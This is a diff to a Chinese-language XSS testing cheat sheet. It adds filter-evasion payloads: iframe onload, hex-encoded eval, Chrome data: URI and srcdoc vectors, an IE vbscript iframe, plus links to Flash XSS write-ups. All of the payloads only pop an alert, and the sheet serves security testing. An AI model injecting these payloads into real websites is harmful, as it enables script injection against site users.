@@ -17,6 +17,7 @@ xss cheat sheet 即测试xss的测试样表
 ```
 <script>alert(1);</script>
 <script>alert('xss');</script>
+<iframe onload="alert(1)"></iframe>
 ```
 
 ## xss 过滤绕过
@@ -175,6 +176,20 @@ xss另一个载体是CSS样式表，使用CSS样式表执行js具有隐蔽，灵
 </style>
 ```
 
+* eval
+
+```
+<script>
+eval("alert('xss')");
+</script>
+
+# eval 执行十六进制字符串形式
+<script>
+eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29");
+</script>
+
+# eval 执行10进制形式，需要 String.fromCharCode() 配合使用
+```
 
 ## 常见绕过
 
@@ -191,6 +206,45 @@ xss另一个载体是CSS样式表，使用CSS样式表执行js具有隐蔽，灵
 <img/**/src="a"/**/onerror=alert(/xss/)>
 ```
 
+## 浏览器特性
+
+### chrome
+
+* Chrome下data协议执行代码
+
+```
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<iframe src="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
+```
+
+* Chrome下srcdoc属性
+
+```
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
+```
+
+### IE
+
+* IE下vbscript执行代码
+
+```
+<iframe src="vbscript:msgbox(1)"></iframe> 
+```
+
+## flash
+
+[swf反编译软件下载][4]
+
+[ 乌云 Flash Xss入门--navigateToURL][5]
+[ 乌云 Flash Xss进阶--ExternalInterface.call(1)][6]
+[ 乌云 Flash Xss进阶--ExternalInterface.call(2)][7]
+[ 乌云 Flash Xss进阶--addCallback][8]
+
 [1]: http://html5sec.org/
 [2]: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
 [3]: http://drops.wooyun.org/tips/1955
+[4]: https://www.free-decompiler.com/flash/download/
+[5]: http://www.wooyun.org/bugs/wooyun-2010-016512
+[6]: http://www.wooyun.org/bugs/wooyun-2010-016532
+[7]: http://www.wooyun.org/bugs/wooyun-2010-016598
+[8]: http://www.wooyun.org/bugs/wooyun-2010-016803
